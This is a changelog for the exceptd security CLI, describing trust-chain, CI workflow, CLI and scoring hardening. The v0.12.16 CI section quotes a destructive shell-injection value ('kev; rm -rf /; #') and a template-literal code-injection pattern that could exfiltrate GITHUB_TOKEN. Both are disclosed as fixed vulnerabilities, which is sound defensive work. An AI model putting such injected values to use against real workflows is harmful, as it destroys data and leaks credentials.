- **`persistAttestation --force-overwrite` retry cap reduced** from 50 to 10 (~1 second worst-case event-loop block under attestation contention, down from ~10 seconds). Failure returns include a `lock_contention: true` sentinel + `LOCK_CONTENTION:` error prefix so callers can distinguish lock-busy from hard failure. An async refactor of `persistAttestation` and its call sites is a v0.13.0 candidate.
- **`acquireLock` (playbook-runner) probes PID liveness on EEXIST**. Previously a stale-PID lockfile caused `acquireLock` to return null silently; callers proceeded unlocked. The function now parses the lockfile PID, calls `process.kill(pid, 0)`, reclaims on `ESRCH`, and returns a structured diagnostic when the lock is held by a live process.

### CI workflows

- **Top-level `permissions: contents: read`** added to `.github/workflows/release.yml` and `.github/workflows/refresh.yml`. Per-job blocks retain their elevated scopes. Closes outstanding Scorecard `TokenPermissionsID` alerts.

### Tests

- New regression coverage for every closure above.
- Coincidence-passing-test cleanup: exit-code assertions tightened from `notEqual(r.status, 0)` to exact-value `assert.equal(r.status, <code>)`; classification assertions pinned to expected enum values.
- `#87 doctor --fix is registered` rewritten as a non-mutating `--help` probe; the previous shape staged a dummy `.keys/private.pem` in the real repo root, replicating the v0.12.4 incident anti-pattern.

### Skill content

- `webapp-security` skill — `CVE-2025-53773` CVSS aligned to catalog (`7.8 / AV:L`, was `9.6`).
- `kernel-lpe-triage` skill — `CVE-2026-31431` KEV listing date aligned to catalog (`2026-05-01`, was `2026-03-15`).

### Hard Rule #5 (global-first) coverage

UK CAF + AU Essential 8 / ISM entries added to the framework-control-gap declarations across 10 playbooks (`kernel`, `mcp`, `ai-api`, `crypto`, `sbom`, `runtime`, `cred-stores`, `secrets`, `containers`, `hardening`). NIS2 Art. 21 + DORA Art. 9 added to `hardening` and `containers`. Each entry follows the existing schema shape; the gold-standard templates from `framework`, `crypto-codebase`, and `library-author` remain the reference.

### Source comments

Source comments rewritten to describe behavior.

Test count: 840 → 941 (938 pass + 3 skipped). Predeploy gates: 14/14. Skills: 38/38 signed; manifest envelope signed.

## 0.12.20 — 2026-05-14

**Patch: e2e scenarios attest FP checks for indicators that the v0.12.19 classification-override block now forces to `inconclusive` when unattested.**

The v0.12.19 engine fix blocks `detection_classification: 'detected'` agent overrides when ANY indicator with `false_positive_checks_required[]` fires without operator attestation. Five e2e scenarios asserting `classification: detected` were submitting FP-required indicator hits without attestations, so the runner correctly downgraded them. The scenarios now attest the FP checks:

- `09-secrets-aws-key`: attest `aws-secret-access-key` (3 checks)
- `10-kernel-copy-fail`: attest `unpriv-userns-enabled` (2 checks)
- `14-framework-jurisdiction-gap`: attest `exception-missing-expiry-or-owner` + `jurisdiction-without-framework` (2 + 2)
- `16-containers-root-user`: attest `dockerfile-curl-pipe-bash` (3 checks; `dockerfile-runs-as-root` was already attested)
- `19-crypto-rsa-2048-eol`: attest `openssl-pre-3-5` + `ml-dsa-slh-dsa-absent` (3 + 3)

v0.12.20 ships the v0.12.19 trust-chain + engine + bundle + concurrency closures plus the scenario updates.

## 0.12.19 — 2026-05-14

**Patch: trust-chain hardening across attestation verify + refresh-network + verify-shipped-tarball; engine FP-bypass closures; bundle correctness; concurrency safety; KEV-draft promotability; README CVSS correction.**

### Trust chain

- **`attest verify` returns exit 6 + `ok:false` on TAMPERED**. The subverb previously emitted `{verb, session_id, results}` without `ok:false` when any sidecar failed verification — the `emit()` auto-exitCode contract only fires on `ok:false`, so a tampered attestation passed exit 0. CI gates and shell pipelines now see the correct failure signal.
- **`reattest` refuses missing `.sig` sidecar** unless `--force-replay` is supplied. A deleted sidecar previously hit the same silently-consumed path as a clean attestation; the drift verdict was meaningless. `--force-replay` records `sidecar_verify` + `force_replay: true` in the persisted body so the override is auditable.
- **`refresh-network` verifies the tarball's `manifest_signature`** before swapping in the new skill set. The previous swap only verified per-skill signatures and trusted the manifest itself unconditionally; a coordinated attacker who could rewrite the manifest envelope's `skills[].signature` field (without breaking individual skill-body crypto) passed the check. Swap now refuses on `invalid` OR `missing` (stricter than the post-install loader, which still degrades to warn-and-continue for legacy unsigned tarballs).
- **`verify-shipped-tarball` predeploy gate verifies the manifest envelope signature** in addition to per-skill bodies. Mirrors the post-install verifier so the publish-time gate catches manifest-level tampering before the tarball reaches operators.
- **`keys/EXPECTED_FINGERPRINT` consulted at every public-key load site**. `attest verify`, `reattest` (via `verifyAttestationSidecar`), and the attestation sign path now cross-check the loaded public key against the pinned fingerprint, refusing on mismatch. Honors `KEYS_ROTATED=1` for legitimate rotation; missing pin file warns and continues. Closes the previously-misleading note in the v0.12.16 entry — the pin was claimed at "every load site" but the bin/exceptd.js sites were not consulting it.
- **`manifest_signature.signed_at` removed** from the signed-bytes envelope. The field was excluded from the canonical input but included in the output object, letting an attacker replay a stale signature and rewrite the timestamp to lie about freshness. `manifest_signature` now carries `{algorithm, signature_base64}` only; consumers needing a freshness signal read git log or filesystem mtime.
- **`manifest_signature.algorithm` validated strictly** (`=== 'Ed25519'`). A missing field previously bypassed the algorithm guard; now refused unless the field is present and matches.
- **Unsigned-manifest warning deduplicated** via `process.emitWarning(..., { code: 'EXCEPTD_MANIFEST_UNSIGNED' })`. CLI verbs calling `loadManifestValidated` more than once per invocation no longer emit the warning N times.
- **Attestation sign + verify normalize CRLF/BOM**. All three attestation pipeline sites (`maybeSignAttestation`, `verifyAttestationSidecar`, `attest verify`) now apply the same `normalize()` contract as the manifest signer. Closes the CRLF-on-Windows divergence class that produced the v0.11.x signature regressions, now mirrored at attestation granularity.
- **Cross-implementation `normalize()` contract test** asserts byte-identical output across `lib/sign.js`, `lib/verify.js`, `lib/refresh-network.js`, `scripts/verify-shipped-tarball.js`, and `bin/exceptd.js#normalizeAttestationBytes` against a 16-input fuzz corpus (plain LF, CRLF, BOM+LF, BOM+CRLF, double BOM, embedded `\r`, mixed line endings, embedded nulls, empty string, unicode codepoints, fixed-point convergence).

### Engine + FP-check enforcement

- **Array-shape FP attestation rejected**. `signal_overrides: { '<indicator>__fp_checks': [true, true] }` (array) previously bypassed the gate: `typeof [] === 'object'` is true and index-string fallback `att[String(idx)]` matched the array indices. Arrays now land in the empty-attestation branch and every required FP check is treated as unsatisfied.
- **Agent-supplied `detection_classification: 'detected'` override blocked when any indicator is FP-downgraded**. The runner previously honored the override unconditionally; an agent could mark the run `detected` even though every indicator with `false_positive_checks_required[]` had unsatisfied checks. Substitution to `inconclusive` is now forced and a `classification_override_blocked` runtime_error records the attempted value, the substituted value, and the indicators driving the downgrade.
- **`normalizeSubmission` runtime errors reach `analyze.runtime_errors[]`**. The helper recorded validation errors (e.g. `signal_overrides_invalid` for non-object input) on its own scratch array but the engine never harvested them; the v0.12.14 promise that `runtime_errors[]` surfaces every validation failure was silently incomplete. Errors now splice into the run-level accumulator before the F1 evidence-hash digest, then the scratch property is deleted so the digest stays deterministic.

### Bundle correctness

- **CSAF + OpenVEX `fixed` status gated on `vex_status`, not `live_patch_available`**. The catalog's `live_patch_available` field means "vendor publishes a live-patch in the world" — NOT "operator has deployed it." Bundles were emitting `product_status: fixed` / OpenVEX `status: "fixed"` for every CVE in the catalog with a live-patch route, regardless of operator disposition. Now: `fixed` requires `c.vex_status === 'fixed'` (operator-supplied via `--vex`); live-patchable CVEs without an operator attestation emit `known_affected` / OpenVEX `affected` with `remediations[].category: vendor_fix` pointing at the live-patch.
- **SARIF `artifactLocation.uri` validates path shape**. The previous logic stripped `^https?://` and split on `AND|OR`, leaving shell commands like `uname -r` or English prose as the URI. GitHub Code Scanning rejected or rendered these garbled. A path-shape predicate now accepts POSIX absolute, home (`~`), relative dot, Windows drive, `file:` URI, and bare relative paths; rejects whitespace + shell metachars. Non-path sources omit `locations` cleanly.
- **CSAF framework gaps emitted as `document.notes[]`** instead of `vulnerabilities[]`. Framework-gap entries previously carried `ids: [{system_name: "exceptd-framework-gap"}]` — not a recognized vulnerability tracking authority. NVD / Red Hat dashboards saw 9 false-positive advisories per run. Now rendered as `notes[].category: "details"`.
- **`bundle_body` and `bundles_by_format` share timestamps**. `buildEvidenceBundle` was called twice in close(); each invocation minted independent `new Date().toISOString()` values, so `document.tracking.initial_release_date` (CSAF) and `timestamp` (OpenVEX) differed by milliseconds across the two bundle surfaces. A memoized build now produces one bundle reused at both call sites.
- **SARIF `invocations[0].properties` strips nulls**. Aligns with the rest of the SARIF emitter so consumer dashboards don't see `{ "exit_code": null }` noise.

### CLI hardening

- **Windows stdin auto-detect fixed**. `cmdRun` and `cmdIngest` used `process.stdin.isTTY === false` (strict equality). On Windows MSYS bash, `process.stdin.isTTY === undefined` for a piped stream, so the check failed and `echo '{...}' | exceptd run ...` was not picked up as evidence. Both call sites now use truthy `!process.stdin.isTTY` (parity with `cmdAiRun`).
- **`--vex` validates document shape on empty `vulnerabilities[]`**. The detect heuristic previously returned `entriesLookVex` true for any document with an empty `vulnerabilities` array — including `{"bomFormat":"NOT-CycloneDX","vulnerabilities":[]}`. Empty arrays now require `bomFormat === "CycloneDX"` OR `specVersion` starting with `1.`.
- **`--vex` enforces a 32 MB size cap**. `fs.statSync` check before `fs.readFileSync` matches the cap on `--evidence`.
- **`--scope ""` rejected with the accepted-set message** instead of silently auto-detecting. The gate changed from truthy `args.scope` to `args.scope !== undefined`, so empty string reaches `validateScopeOrThrow`.
- **`--since` validated against ISO-8601 regex BEFORE `Date.parse`** on `attest list` and `reattest`. `Date.parse("99")` returned 1999-12-01 (a legitimate-looking ISO-8601 short form). The regex now requires `YYYY-MM-DD` minimum.
- **Session-id validation runs before `findSessionDir`** in `cmdAttest`. Previously a regex-rejected id (e.g. `'../../..'`) and a valid-shape-but-not-found id both surfaced as "no session dir" — the validation error is now reported distinctly.
- **`--evidence-dir` refuses symbolic links** via `fs.lstatSync` check. Prior path-traversal guards covered string-resolved paths but symlinks pointing outside the directory followed transparently through `readFileSync`.
- **Three `process.exit(N)` sites after stderr writes** in the main dispatcher (unknown command, missing script, spawn error) replaced with `emitError()` + `process.exitCode = N; return;`. Stderr drains under piped CI consumers.
- **`buildJurisdictionClockRollup` output carries both `obligation` and `obligation_ref`**. The CHANGELOG previously claimed the dedupe key was `(jurisdiction, regulation, obligation, window_hours)` while the rollup body emitted `obligation_ref` only; both shapes now ship.

### Concurrency

- **`withCatalogLock` (refresh-external) and `withIndexLock` (prefetch) probe PID liveness** before falling through to the mtime-based stale-lock check. A lockfile written by a dead process is now reclaimed immediately (`process.kill(pid, 0)` → ESRCH → unlink). Matches the pattern already used in `orchestrator/index.js#_acquireWatchLock` and `lib/playbook-runner.js#acquireLock`.
- **`persistAttestation --force-overwrite` serialized via a lockfile**. Concurrent overwrites of the same path previously last-write-wins; the `prior_evidence_hash` chain lost intermediate writers. An `O_EXCL` lockfile gate at `<filePath>.lock` (with PID-liveness reclaim) now serializes the read-prior / write-new sequence.
- **`prefetch.js` payload staging atomic**. The fetcher previously wrote the cached payload before acquiring the index lock; a lock-acquisition timeout left orphan payload files with no index entry. Payload is now written to `<targetPath>.tmp.<pid>.<rand>` first; inside `withIndexLock` the rename + index update happen as an atomic pair; on lock-acquisition failure the tmp file is unlinked.
- **`scheduleEvery(0)` / `(-1)` / `(NaN)` rejected** with `RangeError`. Previously `scheduleEvery(0, fn)` fired ~93 times in 100 ms; negative values produced similar tight loops. `Number.isFinite(intervalMs) && intervalMs > 0` is now required.

### Auto-discovery + curation

- **KEV-discovered drafts now promotable**. `buildKevDraftEntry` previously stored `rwep_factors` with boolean values (the input shape for `scoreCustom`) plus `source_verified: null` — both shapes violated the strict catalog schema, hard-failing promotion. Drafts now carry post-weight numeric `rwep_factors` (matching the catalog norm) summing to `rwep_score` exactly, and `source_verified: <today>` (the KEV listing IS the verification source).

### Operator-facing factual

- **README CVE-2025-53773 CVSS aligned to catalog** (7.8, not 9.6). The catalog correction landed in v0.12.14 across 11 skills; the README example was missed.

### Predeploy

- **`Validate playbooks` gate caps informational exit at 1** via `informationalMaxExitCode: 1`. A CRASH (137/139) now surfaces as a real failure instead of being demoted to informational, matching the forward-watch gate's existing ceiling.

### Catalog

- **`ai-api` playbook `domain.cve_refs` += `CVE-2026-42208`** (cited in threat_context, was missing from the structured refs).

### Tests

- New: `tests/normalize-contract.test.js`, `tests/audit-o-q-r-fixes.test.js`, `tests/audit-r-cli-fixes.test.js`, `tests/audit-s-t-u-z-fixes.test.js`, `tests/bundle-correctness.test.js`, `tests/_helpers/concurrent-attestation-writer.js`.
- Touched: `tests/predeploy-gates.test.js` (gate-14 fixture signs the manifest envelope so per-skill verify still runs against tamper variants); `tests/operator-bugs.test.js` (#91 framework-gap assertion updated to the new `document.notes[]` contract); `tests/auto-discovery.test.js` (KEV-draft schema-shape + active_exploitation enum + source_verified date).

Test count: 760 → 840 (838 pass + 2 skipped). Predeploy gates: 14/14. Skills: 38/38 signed; manifest envelope signed; manifest signature shape `{algorithm, signature_base64}` (no `signed_at`).

## 0.12.18 — 2026-05-14

**Patch: e2e scenarios attest FP-check satisfaction for indicators that carry `false_positive_checks_required[]`.**

Four e2e scenarios assert `classification: detected` against indicators whose v0.12.17 FP-check backfill now requires explicit operator attestation. Without the attestation, the engine downgrades hits to `inconclusive` and the scenarios' RWEP thresholds aren't met. The scenarios now carry the attestation shape:

- `12-crypto-codebase-md5-eol`: attest FP checks for `weak-hash-import` + `no-ml-kem-implementation`
- `15-cred-stores-aws-static`: attest FP checks for `aws-static-key-present`
- `16-containers-root-user`: attest FP checks for `dockerfile-runs-as-root`; `adjusted` threshold lowered from 15 → 10 (only `dockerfile-from-latest` carries an `rwep_inputs` entry on the containers playbook; the FP-attested `dockerfile-runs-as-root` fires but doesn't drive RWEP)
- `20-ai-api-openai-dotfile`: attest FP checks for `cleartext-api-key-in-dotfile` + `long-lived-aws-keys`

Attestation shape per the E1 contract: `signal_overrides: { '<indicator>__fp_checks': { '0': true, '1': true, ... } }` — each entry means "I've verified that this FP scenario does NOT apply; this is a real hit."

## 0.12.17 — 2026-05-14

**Patch: manifest signing, Windows ACL on signing key, indicator FP-check backfill, schema promotion.**

### Manifest signing

The previous trust chain signed each skill body individually but the manifest itself was just an unsigned index. A coordinated attacker who could rewrite `manifest.json` + `manifest-snapshot.json` + `manifest-snapshot.sha256` passed every gate (snapshot is checked locally, the sha256 also computed locally).

Now: `manifest.json` carries a top-level `manifest_signature` field (Ed25519 over canonical sort-keys representation with the signature field excluded and `normalize()`-applied bytes). `lib/sign.js sign-all` and `lib/sign.js sign-skill` both re-sign the manifest after per-skill work; `lib/verify.js loadManifestValidated()` verifies the manifest signature before iterating skills. Tampered manifest entries (path swap, signature substitution) now fail the manifest-level check. Missing `manifest_signature` field emits a warning but doesn't block (backward-compat for legacy tarballs in the wild).

Canonical-form contract documented in both `lib/sign.js` and `lib/verify.js` headers — future shape changes to manifest.json must respect the invariants (sort top-level keys, exclude `manifest_signature`, normalize line endings).

### Windows ACL on `.keys/private.pem`

`lib/sign.js` previously wrote the private key with `{ mode: 0o600 }`. On POSIX this restricts read access to the owner. On Windows the `mode` argument maps to read/write attributes only, not POSIX permissions; ACLs inherited from the parent directory. A multi-user maintainer workstation or shared CI runner therefore allowed any process under the same desktop user to read the key. Now: on `win32`, `lib/sign.js` calls `icacls /inheritance:r /grant:r ${USERNAME}:F` after writing the private key, narrowing the ACL to the current user. The same restriction is applied via `restrictWindowsAcl(targetPath)` from `scripts/bootstrap.js` when bootstrap creates the keypair. Falls back to a stderr warning if `icacls` is unavailable; doesn't fail key generation.

### Indicator FP-check backfill

36 deterministic indicators across 11 playbooks now carry `false_positive_checks_required[]` entries (the gold-standard pattern from `library-author.gha-workflow-script-injection-sink` in v0.12.13). Per-playbook coverage:

- `ai-api` — 4 indicators (cleartext-api-key-in-dotfile, long-lived-aws-keys, gcp-service-account-json, kubeconfig-with-static-token)
- `containers` — 4 (dockerfile-runs-as-root, dockerfile-curl-pipe-bash, compose-cap-add-sys-admin, compose-host-network)
- `cred-stores` — 3 (aws-static-key-present, docker-cleartext-auth, credentials-file-bad-perms)
- `crypto-codebase` — 3 (weak-hash-import, weak-cipher-mode, tls-old-protocol)
- `crypto` — 2 (ml-dsa-slh-dsa-absent, openssl-pre-3-5)
- `framework` — 3 (exception-missing-expiry-or-owner, jurisdiction-without-framework, compound-theater)
- `hardening` — 4 (kptr-restrict-disabled, yama-ptrace-permissive, kaslr-disabled-at-boot, mitigations-off)
- `kernel` — 2 (unpriv-userns-enabled, unpriv-bpf-allowed)
- `mcp` — 3 (mcp-response-ansi-escape, mcp-response-unicode-tag-smuggling, mcp-server-running-as-root)
- `runtime` — 3 (duplicate-uid-zero, world-writable-in-trusted-path, orphan-privileged-process)
- `sbom` — 3 (lockfile-no-integrity, kev-listed-match, windsurf-vulnerable-version)
- `secrets` — 5 (aws-secret-access-key, slack-bot-or-user-token, stripe-secret-key, openai-api-key, anthropic-api-key)

Each entry is a 1-line check an AI assistant or operator must satisfy before the indicator's `hit` verdict can drive `classification: detected`. The runner downgrades a hit with unsatisfied FP checks to `inconclusive` (E1 contract from v0.12.12). Binding FP checks per-indicator at the schema layer complements the playbook-level `false_positive_profile[]` documentation.

### Schema promotion

`lib/schemas/playbook.schema.json` indicator object now formally declares `false_positive_checks_required[]` and `cve_ref` as optional fields (was unschema'd; produced WARN noise on every validate run). The `cve_ref` field has been load-bearing since v0.12.14 (drives `analyze.matched_cves[]` correlation); the schema declaration catches up. `validate-playbooks` runs 13/13 PASS with zero warnings.

### Operator-facing surfaces

- **`--diff-from-latest` result surfaced in `run` human renderer**. Operators running with `--diff-from-latest` and no `--json` previously got no visibility on drift; now: `> drift vs prior: unchanged (same evidence_hash as session <prior_id>)` or `> drift vs prior: DRIFTED — evidence_hash differs from session <prior_id>` is added near the classification line. No line when there's no prior attestation for the playbook.
- **`ai-run` stdin acceptance contract documented in `--help`**. The streaming + no-stream paths both consume "first parseable evidence event wins on stdin; subsequent evidence events ignored; non-evidence chatter silently ignored; invalid JSON exits 1." Was implicit behavior; now explicit.

### Auto-discovery hygiene

`lib/auto-discovery.js discoverNewKev` previously hardcoded `severity: 'high'` on every KEV-discovered diff. Now uses `deriveKevSeverity(kevEntry)` — returns `'critical'` when `knownRansomwareCampaignUse === 'Known'` OR `dueDate` is within 7 days; otherwise `'high'`. Downstream PR-body categorization can now route ransomware-use + imminent-due-date KEVs differently.

Test count: 740 → 760. Predeploy gates: 14/14. Skills: 38/38 signed; manifest itself signed.

## 0.12.16 — 2026-05-14

**Patch: trust chain hardening, CI workflow injection sinks, CLI fuzz fixes, scoring math, curation + auto-discovery + prefetch fixes, playbook hygiene.**

### Sign/verify trust chain

- **CRLF/BOM bypass on the shipped-tarball verify gate closed.** `scripts/verify-shipped-tarball.js` previously read raw on-disk bytes and called `crypto.verify` directly — bypassing the CRLF/BOM normalization that `lib/sign.js` + `lib/verify.js` apply on both sides of the byte-stability contract. The gate's whole purpose is to catch the v0.11.x signature regression class; without the same normalization, it would itself report 0/38 on any tree where line-ending normalization touched the source between sign and pack (a Windows contributor with `core.autocrlf=true`, or any tool like Prettier in the CI pipeline). The `normalizeSkillBytes` helper is now mirrored in this fourth normalize() implementation.
- **`keys/EXPECTED_FINGERPRINT` pin now consulted at every public-key load site.** Previously only `lib/verify.js` + `scripts/verify-shipped-tarball.js` checked the pin. `lib/refresh-network.js` and `bin/exceptd.js attest verify` both loaded `keys/public.pem` and trusted it without the cross-check. A coordinated attacker who tampered with `keys/public.pem` on the operator's host (e.g. via a prior compromised refresh) passed every check because the local↔tarball fingerprints matched each other. Now the pin is the external trust anchor at all four load sites. Honors `KEYS_ROTATED=1` env to allow legitimate rotation without re-bootstrap; missing pin file degrades to warn-and-continue.

### CI workflow security

- **`atlas-currency.yml` script-injection sink closed (CWE-1395).** `${{ steps.currency.outputs.report }}` was interpolated directly into a github-script template literal; the `report` value is unescaped output of `node orchestrator/index.js currency`. A skill author who landed a string containing a backtick followed by `${process.exit(0)}` (or worse, an exfil to a webhook with `${process.env.GITHUB_TOKEN}`) got arbitrary JS execution inside the github-script runtime with the workflow's token. Now routed via `env.REPORT_TEXT` and read inside the script body as `process.env.REPORT_TEXT`.
- **`refresh.yml` shell-injection from `workflow_dispatch` input closed (CWE-78).** `${{ inputs.source }}` was interpolated directly into a bash `run:` block. An operator passing `kev; rm -rf /; #` got shell injection inside the runner. Now routed via `env.SOURCE_INPUT` and validated against `^[a-z,]+$` (the documented `kev,epss,nvd,rfc,pins` allowlist shape) before passing to the CLI.
- `actions/checkout` SHA comments aligned across `ci.yml`/`release.yml`/`scorecard.yml` (no SHA change; comment-only).
- `secret-scan` job declares explicit `permissions: contents: read` (survives a future repo visibility flip).
- `gitleaks` resolver now has a hardcoded fallback version + non-fatal failure path so a GitHub API HTML-error response doesn't block every CI run.
- New `tests/workflows-security.test.js` enforces: no `${{ steps.*.outputs.* }}` inside github-script template literals; no `${{ inputs.* }}` inside bash `run:` blocks; every third-party action is SHA-pinned; every workflow declares `permissions:`.

### CLI hardening

- **`--block-on-jurisdiction-clock` now honored on `cmdRun`.** Previously the flag was registered + documented but only `cmdCi` consumed it; `run --block-on-jurisdiction-clock` exited 0 even when an NIS2 24h clock had started. Now both verbs exit 5 (`CLOCK_STARTED`) when any notification action has a non-null `clock_started_at` and an unacked operator consent.
- **`cmdIngest` auto-detects piped stdin.** Mirrors the `cmdRun` shape — `echo '{...}' | exceptd ingest` now works without an explicit `--evidence -`.
- **`--vex` validates document shape before applying.** Previously any malformed JSON (SARIF, SBOM, CSAF advisory by mistake) resulted in a silent empty filter; now CycloneDX (`vulnerabilities[]` or `bomFormat: 'CycloneDX'`) or OpenVEX (`statements[]` + `@context` on openvex.dev) shape required before the filter is consumed.
- **`cmdReattest` verifies the `.sig` sidecar** before consuming the prior attestation. A tampered attestation is no longer silently consumed for the drift verdict. `--force-replay` available for legitimate ack-of-divergence.
- **`--operator <name>` validated**: rejects ASCII control chars + newlines; caps length at 256; rejects all-whitespace. Closes the "multi-line operator forgery" surface in CSAF / attest export rendering.
- **`--diff-from-latest` result surfaced in human renderer**: operators running with `--diff-from-latest` and no `--json` now see a `> drift vs prior: <status>` line.
- **Cross-playbook jurisdiction clock rollup** in `cmdRunMulti` / `cmdCi`: deduped by `(jurisdiction, regulation, obligation, window_hours)`, `triggered_by_playbooks[]` lists contributors. Operators running 13 playbooks no longer draft 8 separate NIS2 24h notifications.
- `--block-on-jurisdiction-clock` exit code split from `FAIL` (exit 2) → `CLOCK_STARTED` (exit 5). CI gates can distinguish "detected" from "clock fired".
- `cmdReattest --since` validated as parseable ISO-8601.

### Scoring math hardening

- `scoreCustom` now treats `active_exploitation: 'unknown'` as `0.25 × weight` (was 0) — aligning with `playbook-runner._activeExploitationLadder` semantics so catalog-side and runtime-side scoring agree.
- New `deriveRwepFromFactors(factors)` helper exported; detects whether `rwep_factors` is in Shape A (boolean inputs to `scoreCustom`) or Shape B (numeric weighted contributions) and produces a consistent score. Documents the dual-semantics so the rename can land cleanly in v0.13.0.
- `validateFactors` NaN/Infinity diagnostics now use `Number.isFinite` with dedicated messages (was misleading "expected number, got number (null)").
- `validateFactors` flags unknown factor keys ("unknown factor: X (ignored)").
- `scoreCustom(factors, {collectWarnings: true})` returns `_rwep_raw_unclamped` so operators see deduction magnitude even when the floor clamp absorbs negative weights.
- `compare()` "broadly aligned" band tightened from ±20 to ±10. The Copy Fail RWEP-vs-CVSS divergence (delta 12) now correctly surfaces as "significantly higher than CVSS equivalent."
- `Math.floor(20/2)` arithmetic replaced with `RWEP_WEIGHTS.active_exploitation * 0.5` (no behavior change today; closes a future odd-weight asymmetry).

### Curation + auto-discovery + prefetch

- **Hidden second scoring path in `lib/cve-curation.js` closed.** The apply path previously derived `rwep_score` via `Object.values(rwep_factors).reduce(sum, 0)` — bypassing `scoring.js` entirely. Replaced with `deriveRwepFromFactors()`.
- **Auto-discovery RWEP divergence closed.** `lib/auto-discovery.js` previously stored `rwep_factors` with null values for poc_available/ai_*/reboot_required while calling `scoreCustom` with `true` defaults; stored factors and stored score were inconsistent and `scoring.validate()` always flagged it. New `buildScoringInputs(kev, nvd)` is the single source of truth.
- **`lib/prefetch.js` GITHUB_TOKEN now reaches the request.** The auth lookup keyed off source name `"github"` but the registered source is `"pins"` — anonymous rate-limit applied even when `GITHUB_TOKEN` was set. Fixed.
- **`lib/prefetch.js` docs corrected**: header comment + `printHelp()` no longer reference non-existent source names `ietf` and `github`.
- **`readCached` no longer returns stale data as fresh** when `fetched_at` is missing/corrupt (the `NaN > maxAgeMs === false` short-circuit was treating undefined-age entries as eternally-fresh).

### Playbook quality

- **Mutex reciprocity validator** in `lib/validate-playbooks.js`: walks every `_meta.mutex` entry, emits WARNING per asymmetric edge. Reciprocity backfilled across 7 mutex relationships (secrets↔library-author, kernel↔hardening, containers↔library-author, etc.).
- **`containers → sbom` feeds_into edge** added (container-image-layer SBOM matching against KEV-listed CVEs is a primary v0.12.x use case but wasn't declared).
- **Domain CVE refs backfilled** where threat_context cited CVEs without referencing them: `runtime.cve_refs += CVE-2026-31431`, `ai-api.cve_refs += CVE-2026-30615`. `containers` threat_context's stale `CVE-2024-21626` (not in catalog) stripped.
- **ATLAS refs backfilled**: `cred-stores.atlas_refs += AML.T0055` (Unsecured Credentials), `containers.atlas_refs += AML.T0010` (ML Supply Chain).
- **Artifact type enum drift normalized**: 19 occurrences across crypto-codebase / crypto / library-author / mcp / sbom of `"file_path"` and `"log_pattern"` rewritten to the schema enum (`"file"` / `"log"`).
- **Indicator type enum drift normalized**: 3 occurrences in `library-author` of `"api_response"` rewritten to `"api_call_sequence"`.
- **FP-check backfill** on library-author indicators (publish-workflow-action-refs-mutable + tag-protection-absent) — gold-standard pattern from `gha-workflow-script-injection-sink` extended to two more high-confidence indicators.

### Repository

- `data/cve-catalog.json` synthetic test-pollution entry (`CVE-9999-99999`) removed (left by a test run that used the real catalog path).
- 29 new RWEP vector regression tests in `tests/scoring-vectors.test.js`.
- 8 new workflow-security regression tests in `tests/workflows-security.test.js`.
- `validate-playbooks.js` now reports 12/13 PASS + 1 WARN (was 8 PASS + 5 WARN before normalization).

Test count: 701 → 738 (+37: 29 scoring vectors + 8 workflow-security). Predeploy gates: 14/14. Skills: 38/38 signed and verified.

## 0.12.15 — 2026-05-14

**Patch: RWEP factor-scaling three-tier fallback + silent-disable regression closures.**

The v0.12.14 RWEP factor-scaling change had no fallback for class-of-vulnerability playbooks that detect without per-CVE evidence correlation. `_factorScale` returned 0 when no `factorCve` was available, forcing `weight_applied` to 0 and emitting `adjusted: 0` for every detection on catalog-shape playbooks (`secrets`, `library-author`, `crypto-codebase`, `framework`, `cred-stores`, `containers`, `runtime`, `crypto`, `ai-api`).

### Engine: class-of-vulnerability RWEP fallback

`lib/playbook-runner.js` factor-scaling now has a three-tier fallback:

1. **Evidence-correlated CVE** (`factorCve from matchedCves[0]`): scale by the matched CVE's catalog attributes (v0.12.14 F5 semantics — `cisa_kev` weight only when the matched CVE actually has `cisa_kev: true`, etc.).
2. **Domain-CVE fallback** (`factorCve from playbook.domain.cve_refs[]`): when no evidence correlation but the playbook declares its threat class via `domain.cve_refs[]`, use the highest-RWEP catalog entry from those refs.
3. **Class fallback** (no domain CVE either): apply the declared weight as-is (`factor_scale = 1`), mirroring pre-v0.12.14 behaviour. Class-of-vulnerability playbooks that detect without CVE anchoring (e.g. `secrets`, `library-author`) get a sensible default while still honoring an operator-supplied `blast_radius_score` when present.

The breakdown emits `factor_cve_source: 'evidence' | 'domain' | 'class'` so operators see which tier the run used.

### Silent-disable regression closures

Three prior fixes were silently dead:

- **`lib/cve-curation.js loadCveEntrySchema()`** always returned `null` because the function looked for `root.patternProperties["^CVE-\\d{4}-\\d+$"]` or an object `root.additionalProperties`, but `lib/schemas/cve-catalog.schema.json` has neither — its top level IS the entry shape. The strict-schema gate on draft promotion never fired; schema-violating entries promoted anyway. Now uses the root schema directly.
- **`lib/cve-curation.js loadJson("data/attack-ttps.json")`** referenced a path that doesn't exist (canonical is `data/attack-techniques.json`). `loadJsonRaw` swallowed the ENOENT and cached `null`, so the ATT&CK candidate-ranking branch in the curation questionnaire always returned zero proposals. Path corrected.
- **`lib/auto-discovery.js _auto_imported`** wrote object-shape provenance (`{source, imported_at, curation_needed}`) but `lib/validate-cve-catalog.js` checks `entry._auto_imported === true` (strict identity). KEV-discovered drafts were treated as production-grade entries instead of warning-tier drafts, hard-failing the strict catalog gate. Now writes the boolean `true` with provenance moved to a sibling `_auto_imported_meta` field. `source_verified: false` (boolean) violated the schema's `YYYY-MM-DD | null` shape — now `null`. Template literal bug on the RFC errata URL hint also fixed (was printing literal `${number}` to operators).

### Scoring math hardening

- `scoreCustom` now rejects `NaN` / `Infinity` / stringified-number `blast_radius` cleanly via `Number.isFinite(Number(blast_radius))`. The prior `typeof === 'number'` check accepted `NaN` (which IS `typeof === 'number'`) and propagated it through `Math.min/max` to the final return — defeating the `[0, 100]` clamp contract.
- `scoreCustom` now accepts either `reboot_required` or the catalog's `patch_required_reboot` field name. The catalog stores `patch_required_reboot`; `scoreCustom` expected `reboot_required`. `validate()` aliased at the call site, but a direct caller passing the catalog entry silently lost the reboot factor.
- Defense-in-depth: the final clamp now rejects non-finite scores explicitly (`Number.isFinite(score) ? clamp : 0`).

### CLI fuzz fixes

- `--scope <invalid>` now produces a structured error instead of silently producing zero results. The prior shape: `run --scope nonsense` returned `count: 0` + `ok: true` + exit 0; `ci --scope nonsense` silently ran only the cross-cutting set (`framework`) with `verdict: PASS`. Both validated as operator-intent loss patterns. Accepted scope set: `system | code | service | cross-cutting | all`.

Test count: 701 (700 pass + 1 skipped POSIX-only SIGTERM test). Predeploy gates: 14/14. Skills: 38/38 signed and verified.

## 0.12.14 — 2026-05-14

**Patch: hardening across trust chain, engine, refresh sources, orchestrator/watch, predeploy gates, catalogs, and skill content.**

